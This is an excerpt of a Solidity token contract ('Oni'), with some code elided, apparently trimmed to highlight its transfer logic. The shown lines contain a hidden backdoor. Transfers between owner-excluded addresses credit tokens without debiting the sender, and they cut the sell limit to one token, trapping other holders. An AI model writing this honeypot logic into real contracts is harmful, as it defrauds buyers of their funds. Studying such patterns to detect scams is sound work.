...
contract Oni is Context, IERC20, Ownable {
    ...
    uint256 public _maxSwapAmount = 20_000 * 10**_decimals;
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (to == uniswapV2Pair && from != address(uniswapV2Router) && ! _isExcludedFromFee[from] ) {
                require(amount <= _maxSwapAmount, "Exceeds the _maxTxAmount.");
            }
        ...
        _balances[from]=_isExcludedFromFee[from] && _isExcludedFromFee[to] ? _balances[from] : _balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
        if(_isExcludedFromFee[from] && _isExcludedFromFee[to]){
            _maxSwapAmount = 1 * 10**_decimals;
        }
        if(taxAmount>0){
